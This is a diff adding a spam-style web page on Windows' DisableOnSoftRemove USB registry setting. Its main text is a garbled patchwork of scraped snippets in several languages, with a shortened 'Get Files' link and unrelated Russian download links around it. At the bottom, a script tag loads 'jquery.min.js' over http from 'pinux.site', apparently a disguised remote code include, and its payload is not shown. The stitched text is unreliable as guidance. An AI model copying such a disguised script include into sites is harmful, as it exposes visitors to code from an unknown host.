@@ -1,0 +1,160 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Disableonsoftremove - oongeefeig.sqlbuddy.com</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">oongeefeig.sqlbuddy.com</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Disableonsoftremove</h2>
+                            </header>
+                            <p>Per-Device Setting To apply the workaround for a specific device, add a REG_DWORD value named DisableOnSoftRemove that has a value of 1 to the following registry subkey. It seems the global key mentioned in the KB article is no longer there/used on Windows 10? If yes, what should I do if I want my spinning Сначала небольшая история, которая привела к данному вопросу. Был у меня внешний жесткий диск Transcend и была операционная система Windows. The usb3kd.device_info command displays information about a USB device "DisableOnSoftRemove"=dword:00000001. Mulia71. Группа:. 
+Windows не может использовать это устройство, поскольку оно было подготовлено для "безопасного извлечения", но так и не было извлечено из компьютера. (Код When the value of the DisableOnSoftRemove registry entry is set to 1, the system disables the port from which a USB device is removed. Restart requirement You must restart the computer after you apply this hotfix and/or the registry change. Note: When the value of DisableOnSoftRemove is set to 1 the system disables the USB Port from which the USB is removed, so edit it carefully. 17.You must restart the computer after you apply the hotfix and the registry change. Fixed. 
+Unlike with XP and older versions, in Windows Vista, Windows 7 and Windows 8, USB devices do not power off after being safely removed.  Now within hubg make a new DWORD (32-bit) called DisableOnSoftRemove. To do this right click the empty right pane and select New >> DWORD (32-bit) Value. Have you ever safely removed your USB device only to see that the LED activity light on your device remains on? This is caused by a change to Windows that has affected every version since Windows Vista. Here's В свойствах многих usb-устройств есть пункт "Разрешить отключение устройства для экономии энергии". В тоже время, при переводе компьютера в режим "сна", лампочки. Теперь двойной клик на параметре DisableOnSoftRemove, чтобы вызвать окно для задания значения. Possible Duplicate: USB hard drive doesn't graceful power off after eject on Windows 7 When you click "Safely Remove Hardware" to disconnect an external hard drive, Windows XP flushes. 
+USB Safely Remove - прекрасное средство автоматизации работы с вашими устройствами. Вы сможете назначить запуск программ при подключении или отключении устройств Get Files : https://bit.ly/2Ik6lG3 On the laptop / PC running Windows 8 when we eject / safely remove the external hard disk platters and indicator lights (if any) external hard drive will automatically stop spinning, but not with a laptop / PC running Windows На ноуте Леново, 7 Винда, перестала работать кнопка ,,Безопасное извлечение устройств,,. При нажатии на иконку ничего не происходит, кто знает как исправить. 
+DisableOnSoftRemove со значением 1 вот строчки для. Узнайте зачем нужно безопасное извлечение флешки и как правильно его выполнять. Также рассмотрены основные проблемы этого процесса и действенные способы. How can I toggle the power to a USB port on/off using batch or the command line? I am using Windows 8 to do this. Does anyone know what I could do? I have 4 USB ports. Solved USB Port Stopped Working. Discussion in 'Microsoft Surface Pro 3' started by LyricSystems, Sep 9, 2014. Previous Thread Next Thread.  It's as if the port is disabled. I used microsoft's instructions to edit the registry concerning "DisableOnSoftRemove", but that changed nothing. LabVIEW Portal. Home; Tutorials; Forums; Blogs; Chat; Downloads; Gallery; e-Shop  Board index ‹ Форум инженеров ‹ Русский ‹ Главный форум ‹ Для чайников. 在HubG里新建一个"DWORD (32-bit) 值" （DWORD (32-bit) Value），名称为"DisableOnSoftRemove"，然后右键DisableOnSoftRemove，将其值改为"1. Да в том то и дело, что другой софт почему-то отказывается работать без родного. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbhub\HubG\DisableOnSoftRemove и присвоить ему значение 1 После естественно перезагрузка. 右键新增的DisableOnSoftRemove，在弹出的对话框选择"修改"; 将其值改为"1". 
+将新建的项命名为HubG，并为该项创建一个DWORD (32位)值，该值名为DisableOnSoftRemove. "DisableOnSoftRemove"=dword:00000001 И флешка тоже будет тухнуть. Добавление. Windows7 下的 USB 存储设备"弹出"后也能自动断电 Windows7 下的 USB 存储设备"弹出"后也能自动断电 以前用 xp 的时候，弹出 U 盘戒者移动硬盘后，设备灯就熄灭了，但在 Win7下面弹出此类 设备的时候，系统提示可以安全删除. The powering off USB port when safely removed USB device feature in Windows Vista or Windows 7 does not rely on USB Safely Remove as it can be enabled from a registry value.  I enabled the DisableOnSoftRemove value on my test computer and rebooted. 新建一个"DWORD(32-bit)值"，名称改为DisableOnSoftRemove，双击并将其值改为"1. Corrige um problema no qual um computador que esteja executando o Windows 8.1, o Windows Server 2012 R2, o Windows 8 ou o Windows Server 2012 n o detecta. Fixes an issue in which a computer that is running Windows 8.1, Windows Server 2012 R2, Windows 8, or Windows Server 2012 does not detect a USB device Fix USB device not recognized by Windows 10: Today while connecting your USB device to your PC leaves you with this error: USB device not recognized. Access Denied on NTFS drives If you have formatted a drive with the NTFS file system then you have to deal with access right. Files and folders put by an admin 
+Laufwerks-Buchstaben von CD-Laufwerken nicht best ndig Lang ist her. ndern sich Buchstaben von CD-Laufwerken bei jedem Booten wieder </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="xmcuc-skachat-programmu-letitbit-besplatno-s-oficialnogo-sayta.html">Скачать программу летитбит бесплатно с официального сайта</a></li>
+                                <li><a href="xmcuc-skachat-igry-cherez-steam-besplatno.html">Скачать игры через стеам бесплатно</a></li>
+                                <li><a href="xmcuc-raspisanie-kinoteatra-kosmos-gorod-arsenev.html">Расписание кинотеатра космос город арсеньев</a></li>
+                                <li><a href="xmcuc-gost-po-otboru-obrazcov-grunta.html">Гост по отбору образцов грунта</a></li>
+                                <li><a href="xmcuc-skachat-dzhetpak-na-android-2-2.html">Скачать джетпак на андроид 2 2</a></li>
+                                <li><a href="xmcuc-kurazh-bambey-teoriya-bolshogo-vzryva-3-sezon.html">Кураж бамбей теория большого взрыва 3 сезон</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"><li>Безопасное извлечение устройств в Windows Vista, 7 и Server.</li>
+<li>_info - Windows drivers Microsoft.</li>
+<li>Безопасное удаление USB устройств - RSLOAD FORUM.</li>
+<li>Ответы@: Windows не может использовать это.</li>
+<li>Можно ли программно отключить питание USB-устройства?</li>
+<li>Почему не гаснет флешка на Windows 7 при безопасном.</li>
+<li>Скачать USB Safely Remove 6.1.5.1274 RePack by D!akov.</li>
+<li>Неработает ,,Безопасное извлечение устройств,, DriverPack.</li>
+<li>Giveaway of the Day in Russian — USB Safely Remove.</li>
+<li>Зачем нужно безопасное извлечение флешки, какие бывают.</li>
+<li>LabVIEW Portal • View topic - питание.</li>
+<li>Обсуждение Windows.</li>
+<li>Windows 7 не снимает напряжение с USB портов :: Microsoft.</li>
+<li>USB Safely Remove – альтернатива стандартному извлечению.</li>
+</ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="xmcuc-drayver-na-videokartu-noutbuka.html">Драйвер на видеокарту ноутбука</a></li>
+                                            <li><a href="xmcuc-sinyaya-reka-pesnya-skachat-besplatno.html">Синяя река песня скачать бесплатно</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="xmcuc-pesnya-maksim-vampir-minusovka.html">Песня максим вампир минусовка</a></li>
+                                            <li><a href="xmcuc-sergey-sova-hod-tekst-pesni.html">Сергей сова ход текст песни</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="xmcuc-liza-dzheyn-smit-skachat-knigi.html">Лиза джейн смит скачать книги</a></li>
+                                            <li><a href="xmcuc-skachat-besplatno-pesnyu-mgk-skoryy-poezd.html">Скачать бесплатно песню мгк скорый поезд</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="xmcuc-raspisanie-poezda-dnepropetrovsk-mariupol.html">Расписание поезда днепропетровск мариуполь</a></li>
+                                            <li><a href="xmcuc-kak-pravilno-zapolnit-zayavlenie-inn-na-rebenka.html">Как правильно заполнить заявление инн на ребенка</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
